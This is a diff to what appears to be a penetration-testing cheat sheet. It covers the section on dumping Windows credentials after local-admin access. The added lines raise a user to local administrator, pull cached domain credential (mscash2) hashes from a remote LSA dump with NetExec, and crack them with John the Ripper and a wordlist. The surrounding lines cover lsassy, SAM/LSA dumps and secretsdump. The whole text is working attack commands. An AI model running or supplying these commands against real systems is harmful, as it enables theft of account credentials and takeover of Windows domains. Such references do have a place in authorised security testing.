@@ -213,12 +213,21 @@ export KRB5CCNAME=<user>.ccache
 ## 8. Credential Dumping (post-local-admin)
 
 ```bash
+# First, add your user to administrator group if needed
+net localgroup administrators <user> /add
+
 # nxc lsassy
 nxc smb 192.168.202.141 -u 'username' -p 'pass' -M lsassy
 
 # Remote SAM/LSA dump (no binary drop)
 nxc smb <target> -u <user> -p '<pass>' --sam
 nxc smb <target> -u <user> -p '<pass>' --lsa
+
+# mscash hash from lsa dump
+nxc smb 10.0.2.9 -u user -p pass --lsa | awk '{print $5}' | fgrep '/' | tee mscash_hashes
+# crack them
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=mscash2 mscash_hashes
+
 
 # secretsdump — full remote dump incl. cached domain creds
 secretsdump.py <domain.local>/<user>:'<pass>'@<target>
